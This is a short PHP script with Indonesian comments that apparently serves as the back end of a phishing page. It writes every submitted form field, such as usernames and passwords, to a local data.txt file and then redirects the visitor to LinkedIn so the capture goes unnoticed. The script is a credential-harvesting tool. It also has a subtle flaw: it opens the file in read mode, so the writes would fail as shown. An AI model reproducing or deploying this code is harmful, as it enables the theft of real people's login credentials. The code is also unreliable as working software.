<?php
$handle = fopen("data.txt", "r"); // Ubah "data.txt" sesuai dengan nama file yang ingin Anda gunakan untuk menyimpan data

if ($handle) {
  foreach ($_POST as $variable => $value) {
    fwrite($handle, $variable . ",");
    fwrite($handle, $value . "\r\n");
  }
  fwrite($handle, "\r\n");
  fclose($handle);
} else {
  // Tindakan jika file tidak berhasil dibuka
}

header("Location: https://www.linkedin.com/");
exit;
?>
